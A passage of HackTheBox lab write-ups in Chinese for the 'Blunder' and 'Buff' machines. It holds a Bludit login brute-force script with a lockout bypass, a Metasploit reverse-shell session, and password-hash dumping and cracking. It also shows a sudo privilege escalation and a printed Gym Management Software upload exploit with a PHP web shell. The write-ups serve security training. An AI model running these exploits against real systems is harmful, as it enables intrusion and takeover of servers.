class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.format(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.format(u = username, p = password))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>çˆ†ç ´æˆåŠŸï¼š</p>
<p>userï¼šfergus</p>
<p>passwordï¼šRolandDeschain</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@JIYE:~&#x2F;htb&#x2F;blunder# python3 pass.py </span><br><span class="line">[*] Trying: Plugins</span><br><span class="line">[*] Trying: Include</span><br><span class="line">[*] Trying: service</span><br><span class="line">[*] Trying: Dynamic</span><br><span class="line">[*] Trying: blunder</span><br><span class="line">[*] Trying: interesting</span><br><span class="line">[*] Trying: devices</span><br><span class="line">[*] Trying: content</span><br><span class="line">[*] Trying: created</span><br><span class="line">[*] Trying: Creation</span><br><span class="line">[*] Trying: November</span><br><span class="line">[*] Trying: Reading</span><br><span class="line">[*] Trying: Fantasy</span><br><span class="line">[*] Trying: National</span><br><span class="line">[*] Trying: players</span><br><span class="line">[*] Trying: description</span><br><span class="line">[*] Trying: Favicon</span><br><span class="line">[*] Trying: Bootstrap</span><br><span class="line">[*] Trying: bootstrap</span><br><span class="line">[*] Trying: Networks</span><br><span class="line">[*] Trying: Content</span><br><span class="line">[*] Trying: Stephen</span><br><span class="line">[*] Trying: Sidebar</span><br><span class="line">[*] Trying: nothing</span><br><span class="line">[*] Trying: Copyright</span><br><span class="line">[*] Trying: Powered</span><br><span class="line">[*] Trying: byEgotisticalSW</span><br><span class="line">[*] Trying: Javascript</span><br><span class="line">[*] Trying: American</span><br><span class="line">[*] Trying: fiction</span><br><span class="line">[*] Trying: feature</span><br><span class="line">[*] Trying: published</span><br><span class="line">[*] Trying: received</span><br><span class="line">[*] Trying: awarded</span><br><span class="line">[*] Trying: literature</span><br><span class="line">[*] Trying: centers</span><br><span class="line">[*] Trying: through</span><br><span class="line">[*] Trying: smartphones</span><br><span class="line">[*] Trying: tablets</span><br><span class="line">[*] Trying: library</span><br><span class="line">[*] Trying: Breaked</span><br><span class="line">[*] Trying: September</span><br><span class="line">[*] Trying: supernatural</span><br><span class="line">[*] Trying: suspense</span><br><span class="line">[*] Trying: fantasy</span><br><span class="line">[*] Trying: million</span><br><span class="line">[*] Trying: adapted</span><br><span class="line">[*] Trying: miniseries</span><br><span class="line">[*] Trying: television</span><br><span class="line">[*] Trying: including</span><br><span class="line">[*] Trying: Richard</span><br><span class="line">[*] Trying: Bachman</span><br><span class="line">[*] Trying: written</span><br><span class="line">[*] Trying: approximately</span><br><span class="line">[*] Trying: stories</span><br><span class="line">[*] Trying: collections</span><br><span class="line">[*] Trying: British</span><br><span class="line">[*] Trying: Society</span><br><span class="line">[*] Trying: Foundation</span><br><span class="line">[*] Trying: Distinguished</span><br><span class="line">[*] Trying: Contribution</span><br><span class="line">[*] Trying: Letters</span><br><span class="line">[*] Trying: probably</span><br><span class="line">[*] Trying: fictional</span><br><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br><span class="line"></span><br><span class="line">SUCCESS: Password found!</span><br><span class="line">Use fergus:RolandDeschain to login.</span><br></pre></td></tr></table></figure>

<h2 id="0x08-ç™»å…¥"><a href="#0x08-ç™»å…¥" class="headerlink" title="0x08.ç™»å…¥"></a>0x08.ç™»å…¥</h2><p><code>åªèƒ½æ·»åŠ é™æ€é¡µé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯</code></p>
<img src="/2020/09/19/HTB-blunder/image-20200919100905624.png" class>

<h2 id="0x09-MSFåå¼¹shell"><a href="#0x09-MSFåå¼¹shell" class="headerlink" title="0x09.MSFåå¼¹shell"></a>0x09.MSFåå¼¹shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search bludit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                          Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] Using configured payload php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS                   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER                   yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.87.24.78      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus</span><br><span class="line">bludituser =&gt; gergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschain</span><br><span class="line">bluditpass =&gt; RolandDeschain</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts 10.10.10.191</span><br><span class="line">rhosts =&gt; 10.10.10.191</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost 10.10.17.216</span><br><span class="line">lhost =&gt; 10.10.17.216</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS  RolandDeschain   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER  fergus           yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-access: Authentication failed</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus</span><br><span class="line">bludituser =&gt; fergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[+] Logged in as: fergus</span><br><span class="line">[*] Retrieving UUID...</span><br><span class="line">[*] Uploading ELlQyVUzyq.png...</span><br><span class="line">[*] Uploading .htaccess...</span><br><span class="line">[*] Executing ELlQyVUzyq.png...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.191</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.191:50490) at 2020-09-18 22:16:21 -0400</span><br><span class="line">[+] Deleted .htaccess</span><br><span class="line"></span><br><span class="line">meterpreter &gt; id</span><br><span class="line">[-] Unknown command: id.</span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown command: whoami.</span><br></pre></td></tr></table></figure>

<p><code>wwwç”¨æˆ·æ²¡æœ‰æƒé™</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3590 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ </span><br><span class="line"></span><br><span class="line">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ cd hugo</span><br><span class="line">cd hugo</span><br><span class="line">www-data@blunder:/home/hugo$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  user.txt</span><br><span class="line">Documents  Music      Public    Videos</span><br><span class="line">www-data@blunder:/home/hugo$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@blunder:/home/hugo$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">www-data@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ cd shaun</span><br><span class="line">cd shaun</span><br><span class="line">www-data@blunder:/home/shaun$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos</span><br><span class="line">www-data@blunder:/home/shaun$</span><br></pre></td></tr></table></figure>

<p><code>ä¸‹é¢æŸ¥æ‰¾bludité…ç½®æ–‡ä»¶ï¼Œå¯»æ‰¾ç”¨æˆ·hashå¯†ç </code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@blunder:/home/shaun$ cd /var/www/</span><br><span class="line">cd /var/www/</span><br><span class="line">www-data@blunder:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">bludit-3.10.0a  bludit-3.9.2  html</span><br><span class="line">www-data@blunder:/var/www$ cd bbludit-3.10.0a^[[D</span><br><span class="line">cd bbludit-3.10.0a</span><br><span class="line">bash: cd: bbludit-3.10.0a: No such file or directory</span><br><span class="line">www-data@blunder:/var/www$ cd bludit-3.10.0a</span><br><span class="line">cd bludit-3.10.0a</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE    bl-content  bl-languages  bl-themes  install.php</span><br><span class="line">README.md  bl-kernel   bl-plugins    index.php</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content</span><br><span class="line">cd bl-content</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls</span><br><span class="line">ls</span><br><span class="line">databases  pages  tmp  uploads  workspaces</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases</span><br><span class="line">cd databases</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls</span><br><span class="line">ls</span><br><span class="line">categories.php  plugins       site.php    tags.php</span><br><span class="line">pages.php       security.php  syslog.php  users.php</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php</span><br><span class="line">cat users.php</span><br><span class="line">&lt;?php defined(&#x27;BLUDIT&#x27;) or die(&#x27;Bludit CMS.&#x27;); ?&gt;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;admin&quot;: &#123;</span><br><span class="line">        &quot;nickname&quot;: &quot;Hugo&quot;,</span><br><span class="line">        &quot;firstName&quot;: &quot;Hugo&quot;,</span><br><span class="line">        &quot;lastName&quot;: &quot;&quot;,</span><br><span class="line">        &quot;role&quot;: &quot;User&quot;,</span><br><span class="line">        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;&quot;,</span><br><span class="line">        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,</span><br><span class="line">        &quot;tokenRemember&quot;: &quot;&quot;,</span><br><span class="line">        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,</span><br><span class="line">        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,</span><br><span class="line">        &quot;twitter&quot;: &quot;&quot;,</span><br><span class="line">        &quot;facebook&quot;: &quot;&quot;,</span><br><span class="line">        &quot;instagram&quot;: &quot;&quot;,</span><br><span class="line">        &quot;codepen&quot;: &quot;&quot;,</span><br><span class="line">        &quot;linkedin&quot;: &quot;&quot;,</span><br><span class="line">        &quot;github&quot;: &quot;&quot;,</span><br><span class="line">        &quot;gitlab&quot;: &quot;&quot;&#125;</span><br><span class="line">&#125;</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$`</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==">è§£ç åœ°å€<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>hashå€¼ï¼šfaca404fd5c0a31cf1897b823c695c85cffeb98d</p>
<p>ç”¨æˆ·ï¼šHugo</p>
<p>è§£ç ï¼šPassword120</p>
</blockquote>
<h2 id="0x010-ææƒ"><a href="#0x010-ææƒ" class="headerlink" title="0x010.ææƒ"></a>0x010.ææƒ</h2><p><code>Hugoç™»å…¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ su hugo</span><br><span class="line">su hugo</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">hugo@blunder:/home$ whoami</span><br><span class="line">whoami</span><br><span class="line">hugo</span><br><span class="line">hugo@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">hugo@blunder:/home$ <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">hugo@blunder:~$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">hugo@blunder:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">hugo@blunder:~$ </span><br></pre></td></tr></table></figure>

<p><code>åˆ©ç”¨/bin/bashææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hugo on blunder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line">hugo@blunder:~$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">root@blunder:/home/hugo<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@blunder:/home/hugo<span class="comment"># cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@blunder:/<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">bin    dev  home   lib64       media  proc  sbin  sys  var</span><br><span class="line">boot   etc  lib    libx32      mnt    root  snap  tmp</span><br><span class="line">cdrom  ftp  lib32  lost+found  opt    run   srv   usr</span><br><span class="line">root@blunder:/<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">root@blunder:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@blunder:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">*************************************</span><br><span class="line">root@blunder:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[buff]</title>
    <url>/2020/09/01/HTB-buff/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/09/01/HTB-buff/image-20200905172118673.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¼€æ”¾äº†8080ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># nmap -sC -sV -sT 10.10.10.198 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 02:33 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.198</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">|_http-title: mrb3n<span class="string">&#x27;s Bro Hut</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 60.65 seconds</span></span><br><span class="line"><span class="string">root@JIYE:~/htb/buff# </span></span><br></pre></td></tr></table></figure>

<h2 id="0x02-è®¿é—®8080"><a href="#0x02-è®¿é—®8080" class="headerlink" title="0x02.è®¿é—®8080"></a>0x02.è®¿é—®8080</h2><p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°ä½¿ç”¨äº†Gym Management Software 1.0</code></p>
<img src="/2020/09/01/HTB-buff/image-20200901144251166.png" class>

<h2 id="0x03-æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE"><a href="#0x03-æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE" class="headerlink" title="0x03.æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE"></a>0x03.æŸ¥æ‰¾expï¼Œå­˜åœ¨RCE</h2><p><code>åˆ©ç”¨è¯¦æƒ…</code></p>
<blockquote>
<p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDg1MDY=">exp url<i class="fa fa-external-link-alt"></i></span></p>
<p> 1.è®¿é—®â€œ /upload.phpâ€é¡µé¢ï¼Œå› ä¸ºå®ƒä¸æ£€æŸ¥ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¼šè¯ã€‚</p>
<p> 2.å°†GETè¯·æ±‚çš„â€™idâ€™å‚æ•°è®¾ç½®ä¸ºæ‰€ä¸Šä¼ çš„PHPæ–‡ä»¶æ‰€éœ€çš„æ–‡ä»¶åã€‚</p>
<p> 3.é€šè¿‡æ·»åŠ ä¸¤ä¸ªæ‰©å±•ç»•è¿‡æ‰©å±•ç™½åå•ï¼Œæœ€åä¸€ä¸ªä½œä¸ºå¯æ¥å—çš„æ‰©å±•ï¼ˆPNGï¼‰ã€‚</p>
<p> 4.é€šè¿‡åœ¨POSTè¯·æ±‚ä¸­å°†â€™fileâ€™å‚æ•°çš„â€™Content-Typeâ€™ä¿®æ”¹ä¸ºâ€™image / pngâ€™æ¥ç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼Œå¹¶å°†â€™puploadâ€™å‚æ•°è®¾ç½®ä¸ºâ€™uploadâ€™ã€‚</p>
<p> 5.åœ¨POSTè¯·æ±‚çš„â€œfileâ€å‚æ•°çš„ä¸»ä½“ä¸­ï¼Œæ’å…¥æ¶æ„çš„PHPä»£ç ï¼š</p>
 <?php echo shell_exec($_GET["telepathy"]); ?>

<p> 6.Webåº”ç”¨ç¨‹åºå°†å¯¹æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œä½¿å…¶å…·æœ‰ä»æ–‡ä»¶åç§°åˆ›å»ºçš„æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªæ‰©å±•é¡¹;ç”±â€™.â€™å­—ç¬¦åˆ†å¼€ã€‚</p>
<p> 7.ä½¿ç”¨å¸¦æœ‰telepathyå‚æ•°çš„GETè¯·æ±‚ï¼Œä¸ä½äºâ€™/upload.php?id=kamehamehaâ€™çš„webshellè¿›è¡Œé€šä¿¡ã€‚</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests, sys, urllib, re</span><br><span class="line">from colorama import Fore, Back, Style</span><br><span class="line">requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">def webshell(SERVER_URL, session):</span><br><span class="line">    try:</span><br><span class="line">        WEB_SHELL = SERVER_URL+<span class="string">&#x27;upload/kamehameha.php&#x27;</span></span><br><span class="line">        getdir  = &#123;<span class="string">&#x27;telepathy&#x27;</span>: <span class="string">&#x27;echo %CD%&#x27;</span>&#125;</span><br><span class="line">        r2 = session.get(WEB_SHELL, params=getdir, verify=False)</span><br><span class="line">        status = r2.status_code</span><br><span class="line">        <span class="keyword">if</span> status != 200:</span><br><span class="line">            <span class="built_in">print</span> Style.BRIGHT+Fore.RED+<span class="string">&quot;[!] &quot;</span>+Fore.RESET+<span class="string">&quot;Could not connect to the webshell.&quot;</span>+Style.RESET_ALL</span><br><span class="line">            r2.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(Fore.GREEN+<span class="string">&#x27;[+] &#x27;</span>+Fore.RESET+<span class="string">&#x27;Successfully connected to webshell.&#x27;</span>)</span><br><span class="line">        cwd = re.findall(<span class="string">&#x27;[CDEF].*&#x27;</span>, r2.text)</span><br><span class="line">        cwd = cwd[0]+<span class="string">&quot;&gt; &quot;</span></span><br><span class="line">        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            thought = raw_input(term)</span><br><span class="line">            <span class="built_in">command</span> = &#123;<span class="string">&#x27;telepathy&#x27;</span>: thought&#125;</span><br><span class="line">            r2 = requests.get(WEB_SHELL, params=<span class="built_in">command</span>, verify=False)</span><br><span class="line">            status = r2.status_code</span><br><span class="line">            <span class="keyword">if</span> status != 200:</span><br><span class="line">                r2.raise_for_status()</span><br><span class="line">            response2 = r2.text</span><br><span class="line">            <span class="built_in">print</span>(response2)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\r\nExiting.&quot;</span>)</span><br><span class="line">        sys.exit(-1)</span><br><span class="line"></span><br><span class="line">def formatHelp(STRING):</span><br><span class="line">    <span class="built_in">return</span> Style.BRIGHT+Fore.RED+STRING+Fore.RESET</span><br><span class="line"></span><br><span class="line">def header():</span><br><span class="line">    BL   = Style.BRIGHT+Fore.GREEN</span><br><span class="line">    RS   = Style.RESET_ALL</span><br><span class="line">    FR   = Fore.RESET</span><br><span class="line">    SIG  = BL+<span class="string">&#x27;            /\\\n&#x27;</span>+RS</span><br><span class="line">    SIG += Fore.YELLOW+<span class="string">&#x27;/vvvvvvvvvvvv &#x27;</span>+BL+<span class="string">&#x27;\\&#x27;</span>+FR+<span class="string">&#x27;--------------------------------------,\n&#x27;</span></span><br><span class="line">    SIG += Fore.YELLOW+<span class="string">&#x27;`^^^^^^^^^^^^&#x27;</span>+BL+<span class="string">&#x27; /&#x27;</span>+FR+<span class="string">&#x27;============&#x27;</span>+Fore.RED+<span class="string">&#x27;BOKU&#x27;</span>+FR+<span class="string">&#x27;=====================&quot;\n&#x27;</span></span><br><span class="line">    SIG += BL+<span class="string">&#x27;            \/&#x27;</span>+RS+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> SIG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> header();</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="built_in">print</span> formatHelp(<span class="string">&quot;(+) Usage:\t python %s &lt;WEBAPP_URL&gt;&quot;</span> % sys.argv[0])</span><br><span class="line">        <span class="built_in">print</span> formatHelp(<span class="string">&quot;(+) Example:\t python %s &#x27;https://10.0.0.3:443/gym/&#x27;&quot;</span> % sys.argv[0])</span><br><span class="line">        sys.exit(-1)</span><br><span class="line">    SERVER_URL = sys.argv[1]</span><br><span class="line">    UPLOAD_DIR = <span class="string">&#x27;upload.php?id=kamehameha&#x27;</span></span><br><span class="line">    UPLOAD_URL = SERVER_URL + UPLOAD_DIR</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.get(SERVER_URL, verify=False)</span><br><span class="line">    PNG_magicBytes = <span class="string">&#x27;\x89\x50\x4e\x47\x0d\x0a\x1a&#x27;</span></span><br><span class="line">    png     = &#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>: </span><br><span class="line">                  (</span><br><span class="line">                    <span class="string">&#x27;kaio-ken.php.png&#x27;</span>, </span><br><span class="line">                    PNG_magicBytes+<span class="string">&#x27;\n&#x27;</span>+<span class="string">&#x27;&lt;?php echo shell_exec($_GET[&quot;telepathy&quot;]); ?&gt;&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;image/png&#x27;</span>, </span><br><span class="line">                    &#123;<span class="string">&#x27;Content-Disposition&#x27;</span>: <span class="string">&#x27;form-data&#x27;</span>&#125;</span><br><span class="line">                  ) </span><br><span class="line">              &#125;</span><br><span class="line">    fdata   = &#123;<span class="string">&#x27;pupload&#x27;</span>: <span 